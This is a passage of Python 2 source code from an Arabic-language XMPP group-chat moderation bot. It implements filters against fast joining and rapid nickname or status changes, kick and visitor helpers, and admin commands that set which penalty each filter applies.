                  kick1(s, "ممنوع تغيير الاسماء بصورة سريعة داخل الروم \n STRONG BOT [2022]")
                  return					  
                if "off" not in FILTER_FASTJOIN:      #فلتر الدخول السريع 
                        if not chat in	FAST_JOIN:
                         FAST_JOIN[chat]={}				
                        if not chat in FILTER_USER.keys():
                                FILTER_USER[chat]={}
                        if not jid in FILTER_USER[chat].keys():
                                FILTER_USER[chat][jid]={'lfly':0, 'lastprs':0,'new':0,'timz':0,'top':0}						
                        if ni_aa != True:
                         if st_aa != True:								  
                          if time.time()-FILTER_USER[chat][jid]['lastprs']<=TIME_JOIN:						
                                if not 'JOIN' in FAST_JOIN[chat].keys():                                
                                    FILTER_USER[chat][jid]['lfly']+=1
                                    if FILTER_USER[chat][jid]['lfly']>2:     
                                         del FILTER_chang[chat][jid]
                                         filter_pres_start(m, XFiltMSG[64],type,query,iq,chat,jid,xs,cljid)
                                         return
                                elif FAST_JOIN[chat]['JOIN']=='تعطيل'.decode('utf8'):
                                        pass

                                elif FAST_JOIN[chat]['JOIN']=='فصل'.decode('utf8'):
                                        ban1(cljid, chat, XFiltMSG[64], jid)
                                        return							
                                elif FAST_JOIN[chat]['JOIN']=='حجب'.decode('utf8'):
                                    FILTER_USER[chat][jid]['lfly']+=1
                                    if FILTER_USER[chat][jid]['lfly']>NEW_JOIN:
                                         filter_pres_start(m, XFiltMSG[64],type,query,iq,chat,jid,xs,cljid)
                                         return

                                        
                                                
                          else: 
                                FILTER_USER[chat][jid]['lfly']=0
                                FILTER_USER[chat][jid]['top']=0
                                FILTER_USER[chat][jid]['lastprs']=time.time()

                        
                try: 

                                if jid in CHNICK[chat].keys():
                                        i = xs_003(m, "".join(CHNICK1[chat].keys()).split(jid+" ")[1].split("#")[0])
                                        query.addRawXml(i.toXml())
                                        reactor.callFromThread(iq.send, xs['from'],)
                                        return

                except: pass
                try:                                 
                                if jid in CHSTATUS[chat].keys():
                                        i = xs_002(m, "".join(CHSTATUS1[chat].keys()).split(jid+" ")[1].split("#")[0])
                                        query.addRawXml(i.toXml())
                                        reactor.callFromThread(iq.send, xs['from'],)
                                        return
                except: pass    						
        query.addRawXml(m.toXml())
        reactor.callFromThread(iq.send, xs['from'])
	
		
def speed_chang_status(st_aa,status,chat,jid): 
 
 if st_aa == True:
  if time.time()-FILTER_chang[chat][jid]['time']<=10:
   FILTER_chang[chat][jid]['len1']+=1 
   if FILTER_chang[chat][jid]['len1']>= 2: 
    return True
  else: 
   FILTER_chang[chat][jid]['time']= time.time()
   FILTER_chang[chat][jid]['len1']=0
   FILTER_chang[chat][jid]['status']= status    
   return False
  
def speed_chang_nick(ni_aa,nick,chat,jid):   
 if ni_aa == True: 
  if time.time()-FILTER_chang[chat][jid]['time']<=10:
   FILTER_chang[chat][jid]['len']+=1 
   if FILTER_chang[chat][jid]['len']>= 2: 
    return True
  else: 
   FILTER_chang[chat][jid]['time']= time.time()
   FILTER_chang[chat][jid]['len']=0
   FILTER_chang[chat][jid]['nick']= nick   
   return False
	
def test_chang_nick(nick,chat,jid):
 if nick != FILTER_chang[chat][jid]['nick']:
  FILTER_chang[chat][jid]['nick']=nick 
  return True
 else: 
  return False
 
def test_chang_status(status,chat,jid):	
 if status != FILTER_chang[chat][jid]['status']:
  FILTER_chang[chat][jid]['status']=status
  return True
 else: return False 

######################################################
######################################################
#اوامر التغيير

def add_chmsg(t, s, p):
        f = ''
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in CHMSG:
                CHMSG[s[1]]={}
        if not s[1] in CHMSG1:
                CHMSG1[s[1]]={}				
        if not p:
                f = '\n'.join(CHMSG1[s[1]].keys())
                if t == 'groupchat':
                        reply(t, s, s[2]+' : '+XChMsg[0])							
                reply('chat', s, XChMsg[1]+(f if not f.isspace() else '..؟').replace("#",""))
        elif "@" not in p:
                reply(t, s, s[2]+' : '+XChMsg[2])
        elif " ".split("@")[0] not in p:
                reply(t, s, s[2]+' : '+XChMsg[3])                
        else:
                if not p.split(" ")[0] in CHMSG[s[1]].keys():
                        CHMSG[s[1]][p.split(" ")[0]]={}
                        reply(t, s, s[2]+' : '+XChMsg[4])
                        write_file(CHMSG_FILE, str(CHMSG))
                        CHMSG1[s[1]][p+"#"]={}	
                        write_file(CHMSG1_FILE, str(CHMSG1))						

                else:                       
                        reply(t, s, s[2]+' : '+XChMsg[5])

def remove_chmsg(t, s, p):
        f = ''
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in CHMSG:
                CHMSG[s[1]]={}
        if not s[1] in CHMSG1:
                CHMSG1[s[1]]={}				
        if not p:
                f = '\n'.join(CHMSG1[s[1]].keys())
                if t == 'groupchat':
                        reply(t, s, s[2]+' : '+XChMsg[0])							             
                reply('chat', s, XChMsg[1]+(f if not f.isspace() else '..؟').replace("#",""))	
        elif "@" not in p:
                reply(t, s, s[2]+' : '+XChMsg[6])	
        elif " ".split("@")[0] not in p:
                reply(t, s, s[2]+' : '+XChMsg[7])   				
        else:
                if not p+"#" in CHMSG1[s[1]].keys():
                        reply(t, s, s[2]+' : '+XChMsg[8])
                else:
                        del CHMSG[s[1]][p.split(" ")[0]]
                        del CHMSG1[s[1]][p+"#"]						
                        reply(t, s, s[2]+' : '+XChMsg[9])
                        write_file(CHMSG_FILE, str(CHMSG))
                        write_file(CHMSG1_FILE, str(CHMSG1))						
								

						
register(add_chmsg, XFilter[49], 30)
register(remove_chmsg, XFilter[50], 30)

def add_chnick(t, s, p):
        f = ''
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in CHNICK:
                CHNICK[s[1]]={}
        if not s[1] in CHNICK1:
                CHNICK1[s[1]]={}				
        if not p:
                f = '\n'.join(CHNICK1[s[1]].keys())
                if t == 'groupchat':
                        reply(t, s, s[2]+' : '+XChNick[0])							
                reply('chat', s, XChNick[1]+(f if not f.isspace() else '..؟').replace("#",""))
        elif "@" not in p:
                reply(t, s, s[2]+' : '+XChNick[2])
        elif " ".split("@")[0] not in p:
                reply(t, s, s[2]+' : '+XChNick[3])                
        else:
                if not p.split(" ")[0] in CHNICK[s[1]].keys():
                        CHNICK[s[1]][p.split(" ")[0]]={}
                        reply(t, s, s[2]+' : '+XChNick[4])
                        write_file(CHNICK_FILE, str(CHNICK))
                        CHNICK1[s[1]][p+"#"]={}	
                        write_file(CHNICK1_FILE, str(CHNICK1))						

                else:                       
                        reply(t, s, s[2]+' : '+XChNick[5])

def remove_chnick(t, s, p):
        f = ''
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in CHNICK:
                CHNICK[s[1]]={}
        if not s[1] in CHNICK1:
                CHNICK1[s[1]]={}				
        if not p:
                f = '\n'.join(CHNICK1[s[1]].keys())
                if t == 'groupchat':
                        reply(t, s, s[2]+' : '+XChNick[0])							             
                reply('chat', s, XChNick[1]+(f if not f.isspace() else '..؟').replace("#",""))	
        elif "@" not in p:
                reply(t, s, s[2]+' : '+XChNick[6])	
        elif " ".split("@")[0] not in p:
                reply(t, s, s[2]+' : '+XChNick[7])   				
        else:
                if not p+"#" in CHNICK1[s[1]].keys():
                        reply(t, s, s[2]+' : '+XChNick[8])
                else:
                        del CHNICK[s[1]][p.split(" ")[0]]
                        del CHNICK1[s[1]][p+"#"]						
                        reply(t, s, s[2]+' : '+XChNick[9])
                        write_file(CHNICK_FILE, str(CHNICK))
                        write_file(CHNICK1_FILE, str(CHNICK1))						
								

						
register(add_chnick, XFilter[51], 30)
register(remove_chnick, XFilter[52], 30)
def add_CHSTATUS(t, s, p):
        f = ''
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in CHSTATUS:
                CHSTATUS[s[1]]={}
        if not s[1] in CHSTATUS1:
                CHSTATUS1[s[1]]={}				
        if not p:
                f = '\n'.join(CHSTATUS1[s[1]].keys())
                if t == 'groupchat':
                        reply(t, s, s[2]+' : '+XChStatus[0])							
                reply('chat', s, XChStatus[1]+(f if not f.isspace() else '..؟').replace("#",""))
        elif "@" not in p:
                reply(t, s, s[2]+' : '+XChStatus[2])
        elif " ".split("@")[0] not in p:
                reply(t, s, s[2]+' : '+XChStatus[3])                
        else:
                if not p.split(" ")[0] in CHSTATUS[s[1]].keys():
                        CHSTATUS[s[1]][p.split(" ")[0]]={}
                        reply(t, s, s[2]+' : '+XChStatus[4])
                        write_file(CHSTATUS_FILE, str(CHSTATUS))
                        CHSTATUS1[s[1]][p+"#"]={}	
                        write_file(CHSTATUS1_FILE, str(CHSTATUS1))						

                else:                       
                        reply(t, s, s[2]+' : '+XChStatus[5])

def remove_CHSTATUS(t, s, p):
        f = ''
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in CHSTATUS:
                CHSTATUS[s[1]]={}
        if not s[1] in CHSTATUS1:
                CHSTATUS1[s[1]]={}				
        if not p:
                f = '\n'.join(CHSTATUS1[s[1]].keys())
                if t == 'groupchat':
                        reply(t, s, s[2]+' : '+XChStatus[0])							             
                reply('chat', s, XChStatus[1]+(f if not f.isspace() else '..؟').replace("#",""))	
        elif "@" not in p:
                reply(t, s, s[2]+' : '+XChStatus[6])	
        elif " ".split("@")[0] not in p:
                reply(t, s, s[2]+' : '+XChStatus[7])   				
        else:
                if not p+"#" in CHSTATUS1[s[1]].keys():
                        reply(t, s, s[2]+' : '+XChStatus[8])
                else:
                        del CHSTATUS[s[1]][p.split(" ")[0]]
                        del CHSTATUS1[s[1]][p+"#"]						
                        reply(t, s, s[2]+' : '+XChStatus[9])
                        write_file(CHSTATUS_FILE, str(CHSTATUS))
                        write_file(CHSTATUS1_FILE, str(CHSTATUS1))						
								

						
register(add_CHSTATUS, XFilter[39], 30)
register(remove_CHSTATUS, XFilter[40], 30)
######################################################
######################################################
#ارتباطات فلاتر
def xs_005(m,vv1,status):
        i = domish.Element(('jabber:client', 'presence'))  	
        gg= vv1			
        vv = '%s/%s'%(m['to'].split('/',1)[0],gg)	
        i['to']= vv
        i['from']=m['from']	
        i.addElement('status', 'jabber:client', 'الروم تحت هيمنة بوت سترونج تم تغيير بياناتك بالكامل')
        i.addElement('show', 'jabber:client', 'away')
        return i 
		

def visitor2(s, reason):
    jid_nick = 'jid'
    rol_affl = 'role'
    set_to = 'visitor'
    user = s[2]
    jid = get_true_jid(s)
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i[jid_nick] = user
    i[rol_affl] = set_to
    i.addElement('reason').addContent(reason)
    reactor.callFromThread(packet.send, s[1])
def kick2(s, reason):
    jid_nick = 'jid'
    rol_affl = 'role'
    set_to = 'none'
    user = s[2]
    jid = get_true_jid(s)
    packet = IQ(CLIENTS[s[3]], 'set')
    query = packet.addElement('query', 'http://jabber.org/protocol/muc#admin')
    i = query.addElement('item')
    i[jid_nick] = user
    i[rol_affl] = set_to
    i.addElement('reason').addContent(reason)
    reactor.callFromThread(packet.send, s[1])		




register_iq_handler(Muc_Filter)

def pv_msg(m, msg):
        body = None
        for x in m.elements():
                if x.name == 'body':
                        try: body = x.__str__()
                        except: pass
        ms = domish.Element(('jabber:client','message'))
        ms['to'] = m['from']
        ms['from'] = m['to']
        ms['type'] = 'chat'
        ms.addElement("body", "jabber:client", msg.decode('utf8'))
        return ms			
def load_banos444():
        try:
                fp1 = file("plugins/BAN.py")
                exec fp1 in globals()
                fp1.close()
        except:
                raise		
		
	
					
def add_len(t, s, p):
 if "off" in FILTER_MaXMsG: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else: 
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_FCON:
                MUC_FCON[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_FCON[s[1]]["len"]=p
                write_file(MUC_FCONX_FILE, str(MUC_FCON))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "len" not in ''.join(MUC_FCON[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_MaXMsG))	
                else:
                        f = ''.join(MUC_FCON[s[1]]["len"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))
def add_cens(t, s, p):
 if "off" in FILTER_CENSOR: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else: 
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_MSG:
                MUC_MSG[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_MSG[s[1]]["cans"]=p
                write_file(MUC_MSG_FILE, str(MUC_MSG))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "cans" not in ''.join(MUC_MSG[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_CENSOR))	
                else:
                        f = ''.join(MUC_MSG[s[1]]["cans"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))		
def add_adb(t, s, p):
 if "off" in FILTER_ADB: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else: 
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_adb:
                MUC_adb[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_adb[s[1]]["adblock"]=p
                write_file(MUC_adb_FILE, str(MUC_adb))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "adblock" not in ''.join(MUC_adb[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_ADB))	
                else:
                        f = ''.join(MUC_adb[s[1]]["adblock"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))	
def add_answer(t, s, p):
 if "off" in FILTER_ANswer: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else: 
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_answer:
                MUC_answer[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_answer[s[1]]["answer"]=p
                write_file(MUC_answer_FILE, str(MUC_answer))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "answer" not in ''.join(MUC_answer[s[1]].keys()):
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_ANswer))		
                else:
                        f = ''.join(MUC_answer[s[1]]["answer"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))	

def add_rep(t, s, p):
 if "off" in FILTER_MSG_REP: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_rep:
                MUC_rep[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8')]:
                MUC_rep[s[1]]["rep"]=p
                write_file(MUC_rep_FILE, str(MUC_rep))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8')] and "rep" not in ''.join(MUC_rep[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[5]%(FILTER_MSG_REP))	
                else:
                        f = ''.join(MUC_rep[s[1]]["rep"])		
                        reply(t, s, s[2]+' : '+XFilterRE[5]%(f if not f.isspace() else '..؟'))
def add_speed(t, s, p):
 if "off" in FILTER_MSG_SPEED: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_speed:
                MUC_speed[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8')]:
                MUC_speed[s[1]]["speed"]=p
                write_file(MUC_speed_FILE, str(MUC_speed))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8')] and "speed" not in ''.join(MUC_speed[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[5]%(FILTER_MSG_SPEED))	
                else:
                        f = ''.join(MUC_speed[s[1]]["speed"])		
                        reply(t, s, s[2]+' : '+XFilterRE[5]%(f if not f.isspace() else '..؟'))		
def add_nickx(t, s, p):
 if "off" in FILTER_MAXNICK: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_nick:
                MUC_nick[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_nick[s[1]]["nick"]=p
                write_file(MUC_nick_FILE, str(MUC_nick))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "nick" not in ''.join(MUC_nick[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_MAXNICK))	
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                        f = ''.join(MUC_nick[s[1]]["nick"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))		
def add_statusx(t, s, p):
 if "off" in FILTER_MAX_Status: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_status:
                MUC_status[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_status[s[1]]["status"]=p
                write_file(MUC_status_FILE, str(MUC_status))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "status" not in ''.join(MUC_status[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_MAX_Status))	
                else:
                        f = ''.join(MUC_status[s[1]]["status"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))	
def add_statusr(t, s, p):
 if "off" in FILTER_Status_MSG: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_statusr:
                MUC_statusr[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_statusr[s[1]]["statusr"]=p
                write_file(MUC_statusr_FILE, str(MUC_statusr))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "statusr" not in ''.join(MUC_statusr[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_Status_MSG))
                else:
                        f = ''.join(MUC_statusr[s[1]]["statusr"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))	
def add_statusz(t, s, p):
 if "off" in FILTER_Status_AbD: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_statusz:
                MUC_statusz[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_statusz[s[1]]["statusz"]=p
                write_file(MUC_statusz_FILE, str(MUC_statusz))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "statusz" not in ''.join(MUC_statusz[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_Status_AbD))	
                else:
                        f = ''.join(MUC_statusz[s[1]]["statusz"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))				
			
def add_resx(t, s, p):
 if "off" in FILTER_MAXRES: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_res:
                MUC_res[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8')]:
                MUC_res[s[1]]["res"]=p
                write_file(MUC_res_FILE, str(MUC_res))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8')] and "res" not in ''.join(MUC_res[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[7]%(FILTER_MAXRES))	
                else:
                        f = ''.join(MUC_res[s[1]]["res"])		
                        reply(t, s, s[2]+' : '+XFilterRE[7]%(f if not f.isspace() else '..؟'))				
						
def add_nickz(t, s, p):
 if "off" in FILTER_NICK_None: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_nickz:
                MUC_nickz[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_nickz[s[1]]["nickz"]=p
                write_file(MUC_nickz_FILE, str(MUC_nickz))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "nickz" not in ''.join(MUC_nickz[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_NICK_None))		
                else:
                        f = ''.join(MUC_nickz[s[1]]["nickz"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))	
def add_nickr(t, s, p):
 if "off" in FILTER_NICK: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_nickr:
                MUC_nickr[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_nickr[s[1]]["nickr"]=p
                write_file(MUC_nickr_FILE, str(MUC_nickr))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "nickr" not in ''.join(MUC_nickr[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_NICK))	
                else:
                        f = ''.join(MUC_nickr[s[1]]["nickr"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))			
def FAST_JOIN(t, s, p):
 if "off" in FILTER_FASTJOIN: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in FAST_JOIN:
                FAST_JOIN[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8')]:
                FAST_JOIN[s[1]]["JOIN"]=p
                write_file(FAST_JOIN_FILE, str(FAST_JOIN))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()		
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8')] and "JOIN" not in ''.join(FAST_JOIN[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[7]%(FILTER_FASTJOIN))
                else:
                        f = ''.join(FAST_JOIN[s[1]]["JOIN"])		
                        reply(t, s, s[2]+' : '+XFilterRE[7]%(f if not f.isspace() else '..؟'))

def MSG_NONE4(t, s, p):
 if "off" in FILTER_MSG_NONE: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in NONE_MSGXX:
                NONE_MSGXX[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                NONE_MSGXX[s[1]]["none"]=p
                write_file(NONE_MSGXX_FILE, str(NONE_MSGXX))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "none" not in ''.join(NONE_MSGXX[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_MSG_NONE))
                else:
                        f = ''.join(NONE_MSGXX[s[1]]["none"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))	
def MSG_SPACE4(t, s, p):
 if "off" in FILTER_SPACE: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in SPACE_MSGX:
                SPACE_MSGX[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                SPACE_MSGX[s[1]]["space"]=p
                write_file(SPACE_MSGX_FILE, str(SPACE_MSGX))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "space" not in ''.join(SPACE_MSGX[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_SPACE))	
                else:
                        f = ''.join(SPACE_MSGX[s[1]]["space"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))	
def MUC_SPAM2e(t, s, p):

 if "off" in FILTER_SPAM2: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_SPAM2:
                MUC_SPAM2[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_SPAM2[s[1]]["spam2"]=p
                write_file(MUC_SPAM2_FILE, str(MUC_SPAM2))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "spam2" not in ''.join(MUC_SPAM2[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_SPAM2))	
                else:
                        f = ''.join(MUC_SPAM2[s[1]]["spam2"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))							

def add_flood(t, s, p):
 if "off" in FILTER_FLOOD: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_FCON8:
                MUC_FCON8[s[1]]={}
